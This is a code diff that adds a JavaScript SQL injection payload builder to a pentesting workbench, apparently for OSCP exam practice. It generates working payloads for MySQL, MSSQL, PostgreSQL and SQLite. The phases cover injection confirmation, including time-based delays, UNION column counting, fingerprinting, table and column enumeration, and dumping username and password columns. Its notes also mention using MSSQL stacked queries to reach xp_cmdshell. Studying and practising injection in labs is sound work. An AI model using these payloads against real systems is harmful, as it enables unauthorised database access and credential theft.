@@ -422,5 +422,124 @@
     }
   };
 
+  // ── manual SQL injection builder ────────────────────────────────────────────────────────────
+  // A guided, MANUAL builder: it writes the next payload from what you have learned, you run every query
+  // yourself and paste the result back. No automation, no sqlmap, so it stays OSCP exam-legal. UNION-based
+  // is the teaching spine, with error and time-based detection alongside. Covers the OSCP-common engines.
+  var SQLI_DBMS = {
+    mysql: {
+      name: 'MySQL / MariaDB', comment: '-- -', version: '@@version', user: 'current_user()', db: 'database()',
+      time: 'SLEEP(5)', castText: function (e) { return e; },
+      concat: function (parts) { return 'concat_ws(0x3a,' + parts.join(',') + ')'; },
+      rowsConcat: function (expr, from) { return "SELECT group_concat(" + expr + " SEPARATOR 0x0a) FROM " + from; },
+      tablesFrom: "information_schema.tables WHERE table_schema=database()", tableNameCol: 'table_name',
+      columnsFrom: function (t) { return "information_schema.columns WHERE table_name=0x" + hexLit(t); }, columnNameCol: 'column_name',
+      note: 'Comment with -- - (note the trailing space) or #. Strings compare case-insensitively. 0x-hex avoids quotes inside a quoted context.',
+    },
+    mssql: {
+      name: 'Microsoft SQL Server', comment: '-- ', version: '@@version', user: 'SYSTEM_USER', db: 'DB_NAME()',
+      time: "WAITFOR DELAY '0:0:5'", castText: function (e) { return 'CAST(' + e + ' AS NVARCHAR(4000))'; },
+      concat: function (parts) { return parts.map(function (p) { return 'CAST(' + p + ' AS NVARCHAR(4000))'; }).join("+':'+"); },
+      rowsConcat: function (expr, from) { return "SELECT STRING_AGG(" + expr + ",CHAR(10)) FROM " + from; },
+      tablesFrom: "information_schema.tables", tableNameCol: 'table_name',
+      columnsFrom: function (t) { return "information_schema.columns WHERE table_name='" + t + "'"; }, columnNameCol: 'column_name',
+      note: 'Comment with -- (two dashes, space). UNION columns often need CAST(... AS NVARCHAR). Stacked queries (; EXEC ...) are frequently possible, which opens xp_cmdshell.',
+    },
+    postgres: {
+      name: 'PostgreSQL', comment: '-- ', version: 'version()', user: 'current_user', db: 'current_database()',
+      time: 'pg_sleep(5)', castText: function (e) { return '(' + e + ')::text'; },
+      concat: function (parts) { return parts.map(function (p) { return '(' + p + ')::text'; }).join("||':'||"); },
+      rowsConcat: function (expr, from) { return "SELECT string_agg(" + expr + ",E'\\n') FROM " + from; },
+      tablesFrom: "information_schema.tables WHERE table_schema='public'", tableNameCol: 'table_name',
+      columnsFrom: function (t) { return "information_schema.columns WHERE table_name='" + t + "'"; }, columnNameCol: 'column_name',
+      note: 'Comment with -- (space). Concatenate with ||, cast to ::text so UNION types line up. pg_sleep for time-based.',
+    },
+    sqlite: {
+      name: 'SQLite', comment: '-- ', version: 'sqlite_version()', user: null, db: null,
+      time: null, castText: function (e) { return e; },
+      concat: function (parts) { return parts.join("||':'||"); },
+      rowsConcat: function (expr, from) { return "SELECT group_concat(" + expr + ",x'0a') FROM " + from; },
+      tablesFrom: "sqlite_master WHERE type='table'", tableNameCol: 'name',
+      columnsFrom: null, columnNameCol: null,
+      note: 'Often behind a web app. No current user or database. List tables from sqlite_master; read a table schema with: UNION SELECT sql FROM sqlite_master WHERE name=... . No time-based sleep.',
+    },
+  };
+  function hexLit(s) { return W.hexEnc(s); }
+  W.SQLI_DBMS = SQLI_DBMS;
+  W.sqliDbmsList = function () { return Object.keys(SQLI_DBMS).map(function (k) { return { id: k, name: SQLI_DBMS[k].name }; }); };
+
+  function colList(n, markers) {
+    var a = [];
+    for (var i = 1; i <= n; i++) a.push(markers && markers[i] !== undefined ? markers[i] : i);
+    return a.join(',');
+  }
+
+  // Build the ordered phases for the current state. Progressive: later phases appear as you fill in what
+  // each step reveals. state = {dbms, ctx:'string'|'numeric', cols:int, vis:int, table:string}.
+  W.sqliBuild = function (state) {
+    state = state || {};
+    var d = SQLI_DBMS[state.dbms] || SQLI_DBMS.mysql;
+    var ctx = state.ctx === 'numeric' ? 'numeric' : 'string';
+    var q = ctx === 'string' ? "'" : '';      // break out of the quoted string
+    var c = d.comment;
+    var phases = [];
+
+    // 1. Detect
+    var detect = { key: 'detect', title: '1. Confirm The Injection', note: 'Run each and watch the response. A difference between true and false (or an error, or a delay) confirms it.', items: [] };
+    detect.items.push({ label: 'Break it (look for an error)', payload: q });
+    detect.items.push({ label: 'Always true', payload: q + ' OR 1=1' + c });
+    detect.items.push({ label: 'Always false', payload: q + ' OR 1=2' + c });
+    if (d.time) detect.items.push({ label: 'Time-based (delays ~5s if injectable)', payload: q + ' OR ' + d.time + c });
+    phases.push(detect);
+
+    // 2. Column count
+    phases.push({ key: 'cols', title: '2. Count The Columns', note: 'Increase the number until the page errors. The last number that WORKS is your column count. Then type it below.', items: [
+      { label: 'ORDER BY probe (raise N until it breaks)', payload: q + ' ORDER BY 1' + c },
+      { label: 'Or add NULLs until the page is normal', payload: q + ' UNION SELECT NULL' + c },
+    ] });
+
+    // 3. Visible column (needs cols)
+    if (state.cols > 0) {
+      phases.push({ key: 'vis', title: '3. Find A Visible Column', note: 'Run this. Whichever number shows up on the page is a column you can read from. Type that position below.', items: [
+        { label: 'UNION with ' + state.cols + ' columns', payload: q + ' UNION SELECT ' + colList(state.cols) + c },
+      ] });
+    }
+
+    // 4. Fingerprint / DB info (needs cols + vis)
+    if (state.cols > 0 && state.vis > 0) {
+      function unionWith(expr) {
+        var markers = {}; markers[state.vis] = d.castText(expr);
+        return q + ' UNION SELECT ' + colList(state.cols, markers) + c;
+      }
+      var info = { key: 'info', title: '4. Read The Basics', note: 'Place each value in the visible column. This confirms the engine and your privileges.', items: [] };
+      info.items.push({ label: 'Version', payload: unionWith(d.version) });
+      if (d.user) info.items.push({ label: 'Current user', payload: unionWith(d.user) });
+      if (d.db) info.items.push({ label: 'Current database', payload: unionWith(d.db) });
+      phases.push(info);
+
+      // 5. Tables
+      var tExpr = d.rowsConcat(d.tableNameCol, d.tablesFrom);
+      phases.push({ key: 'tables', title: '5. List The Tables', note: 'This pulls every table name into the visible column at once. Pick a juicy one (users, accounts) and type it below.', items: [
+        { label: 'All tables in this database', payload: q + ' UNION SELECT ' + colList(state.cols, markerAt(state.vis, '(' + tExpr + ')')) + c },
+      ] });
+
+      // 6 + 7. Columns and dump (needs table)
+      if (state.table) {
+        if (d.columnsFrom) {
+          var cExpr = d.rowsConcat(d.columnNameCol, d.columnsFrom(state.table));
+          phases.push({ key: 'columns', title: '6. List That Table’s Columns', note: 'The column names in ' + state.table + '. Note the ones you want (username, password), then build the dump.', items: [
+            { label: 'Columns of ' + state.table, payload: q + ' UNION SELECT ' + colList(state.cols, markerAt(state.vis, '(' + cExpr + ')')) + c },
+          ] });
+        }
+        var dumpExpr = d.rowsConcat(d.concat(['username', 'password']), state.table);
+        phases.push({ key: 'dump', title: '7. Dump The Data', note: 'Replace username,password with the real column names you found. This reads the rows into the visible column.', items: [
+          { label: 'Dump ' + state.table + ' (edit the column names)', payload: q + ' UNION SELECT ' + colList(state.cols, markerAt(state.vis, '(' + dumpExpr + ')')) + c },
+        ] });
+      }
+    }
+    return { dbms: d, phases: phases };
+  };
+  function markerAt(pos, expr) { var m = {}; m[pos] = expr; return m; }
+
   OBOL.workbench = W;
 })(typeof globalThis !== 'undefined' ? globalThis : this);
